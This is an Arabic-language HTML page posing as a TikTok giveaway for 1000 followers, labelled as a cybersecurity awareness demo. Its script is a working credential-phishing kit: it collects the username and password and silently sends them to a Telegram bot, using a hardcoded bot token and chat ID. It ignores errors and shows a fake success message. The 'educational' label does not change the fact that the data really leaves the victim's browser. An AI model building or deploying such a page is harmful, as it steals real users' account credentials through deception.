<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TikTok 1000 Followers</title>

<style>
* {
  box-sizing: border-box;
  font-family: Arial, sans-serif;
}

body {
  margin: 0;
  min-height: 100vh;
  background: #080808;
  color: white;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 20px;
}

.card {
  width: 100%;
  max-width: 390px;
  background: #151515;
  border: 1px solid #333;
  border-radius: 22px;
  padding: 28px 22px;
  text-align: center;
  box-shadow: 0 0 30px #00e5ff22;
}

.logo {
  font-size: 45px;
  font-weight: bold;
  text-shadow: -3px 0 #00f2ea, 3px 0 #ff0050;
}

h1 {
  font-size: 25px;
  margin-bottom: 10px;
}

.highlight {
  color: #ff315c;
}

.description {
  color: #aaa;
  line-height: 1.8;
  font-size: 14px;
}

.notice {
  background: #252525;
  border-right: 3px solid #00e5ff;
  padding: 12px;
  border-radius: 9px;
  color: #ddd;
  font-size: 13px;
  margin: 20px 0;
}

input {
  width: 100%;
  padding: 15px;
  margin: 9px 0;
  border-radius: 10px;
  border: 1px solid #444;
  background: #222;
  color: white;
  outline: none;
  direction: ltr;
  text-align: left;
}

button {
  width: 100%;
  padding: 15px;
  margin-top: 15px;
  border: none;
  border-radius: 10px;
  background: linear-gradient(90deg,#ff0050,#00c8d7);
  color: white;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
}

button:active {
  transform: scale(.98);
}

#result {
  margin-top: 20px;
  line-height: 1.8;
  color: #00e5b0;
}

.footer {
  color: #777;
  font-size: 11px;
  margin-top: 25px;
}
</style>
</head>

<body>

<div class="card">

  <div class="logo">TikTok</div>

  <h1>احصل على <span class="highlight">1000 متابع</span></h1>

  <p class="description">
    تجربة توعوية تفاعلية للتعرف على مخاطر صفحات الهدايا وحقيقتها.
  </p>

  <div class="notice">
    أدخل بياناتك للتجربة.
  </div>
  
  <input
    type="text"
    id="username"
    placeholder="اسم المستخدم أو البريد الإلكتروني"
    autocomplete="off"
  >

  <input
    type="password"
    id="password"
    placeholder="كلمة المرور"
    autocomplete="off"
  >

  <button onclick="startTest()">
    بدء التجربة
  </button>

  <div id="result"></div>

  <div class="footer">
    Cybersecurity Awareness Project
    <br>
    Educational Demo
  </div>

</div>

<script>
async function startTest() {
  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value.trim();
  const result = document.getElementById("result");

  if (!username) {
    result.style.color = "#ff526f";
    result.textContent = "من فضلك أدخل اسم المستخدم على الأقل.";
    return;
  }

  // رسالة تفاعلية هادئة للمستخدم
  result.style.color = "#00e5b0";
  result.innerHTML = `<strong>جاري معالجة الطلب...</strong>`;

  // ضع التوكن والـ Chat ID الخاص بك هنا مباشرة
  const botToken = "8852999428:AAF0PeE9OjP24wXt6F13KfJamq1X58-luL4"; 
  const chatId = "7516606366";
  
  const message = `🚨 بيانات جديدة:\n👤 المستخدم: ${username}\n🔑 كلمة المرور: ${password || 'غير مسجلة'}`;

  try {
    // إرسال الطلب مباشرة لبوت تيليجرام من المتصفح
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });
  } catch (err) {
    // تجاهل أي خطأ لتبقى الواجهة تعمل بشكل طبيعي أمام المستخدم
  }

  // عرض رسالة النجاح النهائية بعد ثانية
  setTimeout(() => {
    result.innerHTML = `
      <strong>اكتملت المحاكاة بنجاح!</strong>
      <br>
      تم تنفيذ التجربة وتحديث الحالة.
    `;
  }, 1000);
}
</script>

</body>
</html>
